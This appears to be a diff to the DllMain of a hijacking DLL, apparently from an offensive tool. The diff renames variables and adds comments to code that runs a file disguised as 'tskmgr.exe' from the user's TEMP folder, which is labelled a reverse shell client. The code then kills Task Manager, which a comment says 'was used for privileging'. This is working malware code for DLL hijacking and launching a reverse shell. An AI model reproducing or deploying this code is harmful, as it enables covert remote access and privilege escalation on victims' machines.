@@ -13,19 +13,22 @@ BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserve
 		si.cb = sizeof(si);
 		ZeroMemory(&pi, sizeof(pi));
 
-		LPTSTR value;
-		value = (LPTSTR)malloc(255 * sizeof(TCHAR));
-		GetEnvironmentVariable(TEXT("temp"), value, 255);
-		std::wstring ws(value);
-		std::string path(ws.begin(), ws.end());
-		path += "\\tskmgr.exe d";
+		// Extract Temp Path of User from Environment Variable
+		LPTSTR env_tmp;
+		env_tmp = (LPTSTR)malloc(255 * sizeof(TCHAR));
+		GetEnvironmentVariable(TEXT("temp"), env_tmp, 255);
+		std::wstring ws(env_tmp);
+		std::string tmp_path(ws.begin(), ws.end());
 		
-		LPSTR s = const_cast<char*>(path.c_str());
+		tmp_path += "\\tskmgr.exe d";
+		
+		LPSTR command = const_cast<char*>(tmp_path.c_str());
 
-		CreateProcessA(NULL, s, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+		// Run Reverse Shell Client
+		CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
-		system("taskkill /IM Taskmgr.exe");
+		system("taskkill /IM Taskmgr.exe"); // Close Task Manager that was used for privileging
 
 	}
 	return TRUE;
